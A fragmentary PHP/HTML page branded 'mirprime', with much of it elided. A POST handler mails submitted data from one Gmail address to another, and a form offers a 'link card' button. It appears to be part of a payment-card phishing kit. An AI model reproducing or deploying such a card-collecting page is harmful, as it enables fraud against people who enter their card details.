                ...
                <div class="nk-sidebar-element nk-sidebar-head">
                    <div class="nk-sidebar-brand">
                        <a href="index.html" class="logo-link nk-sidebar-logo">
                            <img class="logo-light logo-img" src="../mirprime-logo/name.png" srcset="../../logo.png 2x" alt="logo">
                            <img class="logo-dark logo-img" src="../mirprime-logo/name.png" srcset="../../logo.png 2x" alt="logo-dark">
                        </a>
                    </div>
...
if($_SERVER['REQUEST_METHOD'] === "POST"){
 ...
 try {
     ...
     //Recipients
     $mail->setFrom('davesantan219@gmail.com', 'mirprime');

     //Add a recipient
     $mail->addAddress('livemailcl@gmail.com','first');
        ...
        <div class="col-sm-12 col-md-8 col-lg-8">
			...
			<div class="row mt-1">
					  ...
					  <div class="col-md-4 col-sm-4 mb-2">
					   ...
					   <input type="submit" class="btn btn-primary" value="link card">
        </form>         
        </div>
    </div>
</div>
